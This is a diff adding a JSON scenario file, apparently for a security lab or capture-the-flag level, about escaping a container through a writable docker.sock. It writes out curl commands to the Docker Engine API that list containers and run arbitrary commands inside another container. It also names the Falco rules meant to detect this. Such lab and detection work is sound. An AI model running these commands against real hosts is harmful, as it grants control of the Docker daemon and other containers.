@@ -1,0 +1,25 @@
+{
+  "id": "final",
+  "container": "final",
+  "title": "可寫 docker.sock 跨容器任意程式碼執行（Container Escape）",
+  "vuln_type": "container-escape",
+  "exploit_script": "exploits/final.sh",
+  "exploit_steps": [
+    "ls /var/run/ 確認 docker.sock 存在且 player 有權限存取",
+    "curl --unix-socket /var/run/docker.sock http://localhost/containers/json 找到 vault 容器 ID/名稱",
+    "curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/vault/exec -d '{\"Cmd\":[\"cat\",\"/final_flag.txt\"],\"AttachStdout\":true}' 取得 exec ID",
+    "curl --unix-socket /var/run/docker.sock -X POST http://localhost/exec/<ID>/start -d '{}' 觸發實際執行並取得輸出",
+    "解析輸出取得最終 FLAG（EscapeDocker{...}）"
+  ],
+  "expected_outcome": "透過 Docker Engine API（HTTP over Unix socket）對另一個容器（vault）建立並啟動 exec session，執行任意指令並讀取其檔案系統內容，本質上等同擁有 host 上 Docker daemon 的完整控制權",
+  "falco_rule_refs": [
+    "docker_sock_exec_api",
+    "exec_create_in_other_container",
+    "unexpected_child_process_in_container"
+  ],
+  "falco_relevant_behaviors": [
+    "對 /var/run/docker.sock 的 HTTP 請求：GET /containers/json、POST /containers/<name>/exec、POST /exec/<id>/start",
+    "vault 容器內出現非預期的子程序（cat /final_flag.txt，父程序非其原本的 entrypoint）",
+    "由 docker.sock 觸發、在另一容器命名空間中新建的程序——container escape 偵測的核心訊號"
+  ]
+}
